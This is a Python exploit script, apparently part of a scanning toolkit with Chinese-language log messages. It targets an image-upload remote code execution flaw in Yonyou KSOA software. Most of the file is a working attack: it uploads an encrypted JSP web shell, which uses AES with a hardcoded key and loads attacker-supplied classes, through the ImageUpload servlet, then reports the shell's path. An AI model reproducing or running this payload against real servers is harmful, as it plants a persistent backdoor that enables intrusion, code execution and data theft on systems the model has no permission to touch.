import time
import requests
import re
import sys
from urllib.parse import quote
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
hearderx={
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
}
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    console.print(now_time() +  ' [INFO]     正在检测用友 yongyou_KSOA_imageUpload-RCE-漏洞',style='bold blue')
    url = target_url + '/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=nishizhu.jsp&_ZQA_ID=d0d60ec54924481c'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        "Content-Type":"multipart/form-data; boundary=---------------------------122739796041499160471980406311",
    }
    data='''---------------------------122739796041499160471980406311
Content-Disposition: form-data; name="File1"; filename="nishizhu.jsp"
Content-Type: image/jpeg

9df37afc77bdd582d90aefaf4e35c63e<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %><%! private byte[] Decrypt(byte[] data) throws Exception { String k="e45e329feb5d925b"; javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES")); byte[] decodebs; Class baseCls ; try{ baseCls=Class.forName("java.util.Base64"); Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null); decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data}); } catch (Throwable e) { System.out.println("444444"); baseCls = Class.forName("sun.misc.BASE64Decoder"); Object Decoder=baseCls.newInstance(); decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)}); } return c.doFinal(decodebs); } %><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buf = new byte[512]; int length=request.getInputStream().read(buf); while (length>0) { byte[] data= Arrays.copyOfRange(buf,0,length); bos.write(data); length=request.getInputStream().read(buf); } new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);} %>
---------------------------122739796041499160471980406311'''
    shell_url="pictures/nishizhu.jsp"
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url, headers=headers,data=data,verify=False)
        response1 = requests.get(url=url, headers=hearderx,verify=False)
        if response.status_code == 200:
            if response1.status_code == 200:
                console.print(now_time() + " [SUCCESS]  用友 yongyou_KSOA_imageUpload-RCE-漏洞，测试URL为: {}".format(shell_url),style='bold green')
        else:
            console.print(now_time() + " [WARNING]  用友 yongyou_KSOA_imageUpload-RCE-漏洞不存在", style='bold red')
    except:
        console.print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在', style='bold red')

